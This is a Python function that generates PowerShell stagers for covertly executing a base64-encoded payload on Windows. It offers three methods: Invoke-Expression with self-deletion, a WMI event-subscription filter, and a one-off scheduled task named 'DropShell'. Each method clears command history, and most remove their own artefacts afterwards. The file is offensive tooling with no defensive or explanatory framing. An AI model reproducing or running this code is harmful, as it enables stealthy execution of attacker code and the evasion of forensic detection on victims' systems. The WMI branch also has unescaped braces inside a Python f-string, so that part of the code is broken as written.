def attempt_exec(method, encoded_payload):
    if method == "dotnet":
        return f"""
Add-Type -AssemblyName System.Management.Automation;
$e = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded_payload}'));
Invoke-Expression $e;
Clear-History -ErrorAction SilentlyContinue;
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue;
"""
    elif method == "wmi":
        return f"""
Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{
    Name = "SysTrigger"; EventNamespace = "root\\cimv2";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LocalTime'"
} | Out-Null;
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded_payload}')));
Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Remove-WmiObject -ErrorAction SilentlyContinue;
Clear-History -ErrorAction SilentlyContinue;
"""
    elif method == "schtask":
        return f"""
schtasks /create /tn "DropShell" /tr "powershell -encodedCommand {encoded_payload}" /sc once /st 00:01 /f
Start-Sleep -Seconds 2
schtasks /delete /tn "DropShell" /f
Clear-History -ErrorAction SilentlyContinue;
"""
    else:
        return None

